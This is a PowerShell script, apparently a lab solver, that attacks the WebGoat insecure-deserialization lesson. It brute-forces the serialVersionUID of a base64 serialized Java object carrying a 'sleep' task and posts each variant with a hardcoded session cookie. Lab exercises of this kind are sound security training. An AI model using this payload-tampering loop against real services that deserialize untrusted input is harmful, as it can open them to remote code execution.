# ============================================================
# Brute Force SerialVersionUID for VulnerableTaskHolder
# ============================================================

$webGoatUrl = "http://192.168.254.112:8001"
$sessionCookie = "25A6B220A4CB5215EBBE7B31E207B4B1"

Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "SerialVersionUID Brute Force Attack" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""

function Test-Payload {
    param([string]$payload, [string]$description)
    
    Write-Host "Testing: $description" -ForegroundColor Yellow
    
    $startTime = Get-Date
    
    $headers = @{
        "Content-Type" = "application/x-www-form-urlencoded"
        "Cookie" = "JSESSIONID=$sessionCookie"
    }
    
    $body = "token=$([System.Web.HttpUtility]::UrlEncode($payload))"
    
    try {
        $response = Invoke-WebRequest `
            -Uri "$webGoatUrl/WebGoat/InsecureDeserialization/task" `
            -Method POST `
            -Headers $headers `
            -Body $body `
            -UseBasicParsing `
            -TimeoutSec 30
        
        $endTime = Get-Date
        $elapsed = ($endTime - $startTime).TotalSeconds
        
        $result = $response.Content | ConvertFrom-Json
        
        Write-Host "  Feedback: $($result.feedback)" -ForegroundColor White
        Write-Host "  Time: $([math]::Round($elapsed, 2))s" -ForegroundColor Cyan
        Write-Host "  Success: $($result.lessonCompleted)" -ForegroundColor $(if($result.lessonCompleted){'Green'}else{'Gray'})
        
        if ($result.lessonCompleted -eq $true) {
            Write-Host ""
            Write-Host "=====================================" -ForegroundColor Green
            Write-Host "[SUCCESS] Challenge Complete!" -ForegroundColor Green
            Write-Host "=====================================" -ForegroundColor Green
            Write-Host "Working Payload:" -ForegroundColor Green
            Write-Host $payload -ForegroundColor White
            return $true
        }
        
        if ($elapsed -ge 4.5 -and $elapsed -le 5.5) {
            Write-Host "  [DELAY CORRECT!] ~5 seconds" -ForegroundColor Green
        }
        
        Write-Host ""
        return $false
        
    } catch {
        $endTime = Get-Date
        $elapsed = ($endTime - $startTime).TotalSeconds
        Write-Host "  [ERROR] $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "  Time: $([math]::Round($elapsed, 2))s" -ForegroundColor Cyan
        Write-Host ""
        return $false
    }
}

# Function to modify version number in serialized data
function Set-SerialVersionUID {
    param(
        [byte[]]$serialized,
        [long]$version
    )
    
    # Version number is typically at offset 28-35 (8 bytes for long)
    # We need to convert the long to bytes (big-endian)
    $versionBytes = [BitConverter]::GetBytes($version)
    [Array]::Reverse($versionBytes)  # Convert to big-endian
    
    # Copy the serialized data
    $modified = $serialized.Clone()
    
    # Replace version bytes (assuming standard location)
    for ($i = 0; $i -lt 8; $i++) {
        $modified[28 + $i] = $versionBytes[$i]
    }
    
    return $modified
}

# Our base payload (version 1L)
$basePayload = "rO0ABXNyABRWdWxuZXJhYmxlVGFza0hvbGRlcgAAAAAAAAABAgADSgAIdGFza1RpbWVMAAp0YXNrQWN0aW9udAASTGphdmEvbGFuZy9TdHJpbmc7TAAIdGFza05hbWVxAH4AAXhwAAAAAAAAE4h0AAVzbGVlcHQACURlbGF5VGFzaw=="

# Decode base payload
$baseBytes = [System.Convert]::FromBase64String($basePayload)

Write-Host "Base payload info:" -ForegroundColor Cyan
Write-Host "  Length: $($baseBytes.Length) bytes" -ForegroundColor White
Write-Host "  Current version bytes (28-35): " -NoNewline -ForegroundColor White
for ($i = 28; $i -lt 36; $i++) {
    Write-Host ("{0:X2} " -f $baseBytes[$i]) -NoNewline -ForegroundColor Yellow
}
Write-Host "`n"

# Try different version numbers
$versionsToTry = @(2, 3, 4, 5, 10, 42, 100, 1337, 2020, 2021, 2022, 2023, 2024, 2025)

Write-Host "Trying $($versionsToTry.Count) different version numbers..." -ForegroundColor Cyan
Write-Host ""

foreach ($version in $versionsToTry) {
    # Modify the version number
    $modifiedBytes = Set-SerialVersionUID -serialized $baseBytes -version $version
    $modifiedPayload = [System.Convert]::ToBase64String($modifiedBytes)
    
    # Test it
    $success = Test-Payload -payload $modifiedPayload -description "Version $version"
    
    if ($success) {
        Write-Host ""
        Write-Host "Copy this payload to WebGoat:" -ForegroundColor Green
        Write-Host $modifiedPayload -ForegroundColor White
        break
    }
    
    Start-Sleep -Milliseconds 500  # Rate limiting
}

Write-Host ""
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Brute Force Complete" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
